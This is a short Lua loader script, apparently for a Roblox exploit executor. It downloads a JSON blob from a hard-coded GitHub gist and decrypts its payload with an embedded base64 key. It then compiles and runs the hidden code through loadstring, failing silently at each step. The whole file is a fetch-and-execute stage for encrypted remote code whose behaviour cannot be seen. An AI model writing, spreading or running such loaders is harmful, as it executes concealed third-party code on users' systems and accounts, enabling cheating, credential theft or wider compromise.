-- // LOADER \\

local b = game:GetService("HttpService")

local Loader = "https://gist.githubusercontent.com/LOL5678906/ec26ae3c3da550efb1c76290c863b7b5/raw/0a0647f2e300d3dd3455af86a2596cc9bb7bc2b7/BS3.Json"
LoaderV1 = Loader .. "?t=" .. tick()

local K = table.concat({ "MXg2TTE0YjJvMUZwRFFqeUNlWGp0cDU5bFhZMjhkNzU=" })

local ok1, raw = pcall(function()
    return game:HttpGet(LoaderV1)
end)
if not ok1 or type(raw) ~= "string" then return end

local ok2, outer = pcall(function()
    return b:JSONDecode(raw)
end)
if not ok2 or type(outer) ~= "table" then return end

local ok3, src = pcall(function()
    return crypt.decrypt(outer.p, K, outer.i)
end)
if not ok3 or type(src) ~= "string" then return end

local chunk = loadstring(src, "=build")
if not chunk then return end

chunk()
